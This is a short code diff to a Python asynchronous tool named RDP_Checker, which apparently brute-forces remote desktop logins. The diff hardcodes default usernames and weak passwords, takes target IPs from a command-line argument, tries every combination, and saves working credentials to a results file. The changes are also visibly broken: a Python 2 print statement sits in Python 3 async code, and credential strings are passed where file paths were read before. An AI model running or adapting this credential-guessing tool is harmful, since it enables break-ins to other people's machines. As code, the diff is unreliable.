@@ -6,6 +6,20 @@ from platform import system as sys_ver
 
 from aiofiles import open as afile
 from async_timeout import timeout as ftime
+import sys
+
+uuser="""
+admin
+user
+administrator
+"""
+
+ppasswd="""
+12345678
+123456
+00000000
+"""
+
 
 
 # OS Detect
@@ -49,6 +63,7 @@ class RDP_Checker:
     async def __save__(self, data: str) -> None:
         async with afile(f'rez/good.txt', 'a', encoding='utf-8',
                          errors='ignore') as f:
+            print data
             await f.write(data)
 
     async def connect(self, ip: str, user: str, password: str) -> None:
@@ -84,9 +99,9 @@ class RDP_Checker:
     async def main(self) -> None:
         tasks = []
 
-        async for user in self.__read_file__('data/users.txt'):
-            async for passw in self.__read_file__('data/passwords.txt'):
-                async for ip in self.__read_file__('data/ip.txt'):
+        async for user in self.__read_file__(uuser):
+            async for passw in self.__read_file__(ppasswd):
+                async for ip in self.__read_file__(sys.argv[1]):
                     tasks.append(asyncio.ensure_future(self.connect(
                         ip,
                         user,
